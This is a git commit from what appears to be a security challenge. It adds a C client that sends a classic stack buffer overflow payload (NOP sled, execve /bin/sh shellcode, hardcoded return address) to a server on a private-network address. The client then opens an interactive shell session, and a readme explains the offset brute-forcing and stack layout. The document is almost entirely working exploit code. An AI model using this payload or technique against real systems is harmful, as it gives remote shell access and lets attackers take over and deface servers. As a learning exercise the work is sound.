7467c88792d6860d0d78f05d48be4527ff0770c7
cheng-yen.wu <cheng-yen.wu@cheng-yenwus-MacBook-Pro.local>
2021-05-02 23:55:45 +0200

    nu-challenge

---
+++ nu-challange/connection.c
@@ -0,0 +1,121 @@
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <pthread.h>
+
+#include <stdbool.h>
+#define MAX 512
+
+
+
+
+void *fd_write(void* sockfd){
+    int wfd=*(int *) sockfd;
+    int first=1;
+    int n;
+    for (;;) {
+        if (first){
+            sleep(1);
+            first=0;
+        }
+        char buff[MAX];
+
+        bzero(buff, sizeof(buff));
+        n = 0;
+        printf("Enter you command please here : ");
+        fflush(stdout);
+        while ((buff[n++] = getchar()) != '\n')
+            ;
+        
+        write(wfd, buff, sizeof(buff));
+        usleep(5000);
+        if ((strncmp(buff, "exit", 4)) == 0) {
+            printf("Client Exit...\n");
+            break;
+        }
+    }
+    return NULL;
+}
+
+void * fd_read(void* sockfd){
+    int rfd=*(int *)(sockfd);
+    for(;;){
+        char buff[MAX];
+
+        int n = read(rfd,buff,sizeof(buff));
+        if(n==0){
+            printf("End connection");
+            return NULL;
+        }
+        printf("From Server : \n");
+        printf("%s\n",buff);
+        fflush(stdout);
+        memset(buff,0,MAX);
+    }
+    return NULL;
+}
+
+
+
+int connection(int offset){
+    int sockfd=0,connfd ;
+    struct sockaddr_in servaddr;
+    sockfd = socket(AF_INET,SOCK_STREAM,0);
+    if (sockfd == -1) {
+        printf("socket creation failed...\n");
+        exit(0);
+    }
+    else
+        printf("Socket successfully created..\n");
+    
+    bzero(&servaddr,sizeof(servaddr));
+    servaddr.sin_family =AF_INET;
+    servaddr.sin_addr.s_addr=inet_addr("192.168.56.103");
+    servaddr.sin_port=htons(4321);
+    if(connect(sockfd,(const struct sockaddr *)&servaddr,sizeof(servaddr))!=0){
+        printf("connection with the server failed...\n");
+        exit(0);
+    }else{
+        printf("connected to the server...\n");
+    }
+    char msg[256];
+    char * head_msg = msg;
+    memset(msg,0x90,256);
+
+    char shellcode[30]={0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05};
+    int size_sc = 30;
+    char ret_addr[6]={0xf0,0xe5,0xff,0xff,0xff,0x7f};
+    // long ret_addr=0x7fffffffe5f0;
+    memcpy(msg,shellcode,size_sc);
+    memcpy(msg+offset,ret_addr,6);
+    *(head_msg+offset+6) = 0x00; // make msg a string
+    
+    
+    write(sockfd, msg, sizeof(msg));
+    usleep(1000);
+    puts("msg sent\n");
+    pthread_t read_fd, write_fd;
+    int read_ret;
+    pthread_create(&write_fd,NULL,fd_write,(void *)&sockfd);
+    pthread_create(&read_fd,NULL,fd_read,(void *)&sockfd);
+    pthread_join(read_fd,NULL);
+    puts("");
+    return 0;
+}
+
+int main(){
+    connection(140);
+    // for(int offset = 118;offset<150;offset++){
+    //     printf("offset = %d\n",offset);
+    //     connection(offset);
+    //     sleep(1);
+    // }
+    return 0;
+}
---
+++ nu-challange/readme.txt
@@ -0,0 +1,18 @@
+Idea: trying to do the same thing in this video https://www.youtube.com/watch?v=1S0aBV-Waeo&t=613s&ab_channel=Computerphile
+
+Shell code reference : http://shell-storm.org/shellcode/files/shellcode-603.php
+
+low addr                                                                                                                            high addr 
+
+| -------------256(buf)------| ----------128(greeting_txt)--------| -----some registers store(like rbp)------|------6(return addr)-----|
+I dont really know how many byte taken by registers, so i make a for loop to try all the possible offset. and i found the return_addr is at the 12+140=152 after greeting_txt,
+whitch means that there are 3(24/3) registers stored in the stack.
+
+First, i seed a msg whitch contain the shell code, if the server executes the shell code, then the connection will not be closed by server, so i can the command that i want and receieve the messgae from the server.
+If the server doesn't execute the shell code, then the connection will be imediately closed by server(cf sorcecode of server), whitch can be used to test if we have good offset.
+
+I found that i need at least 2 thread to deal with input and output, beacause i wrote it in the same function, and if there is not return messgae from the server, then the function will be stuck and wait the not-existing message. 
+For reason of symetry. i wrote 2 sub_thread fd_write and fd_read whitch write and read the file discriptor sockfd seperiately.
+
+
+Once the server executes shell code, i can reuse the bash command to write my name in the index.html
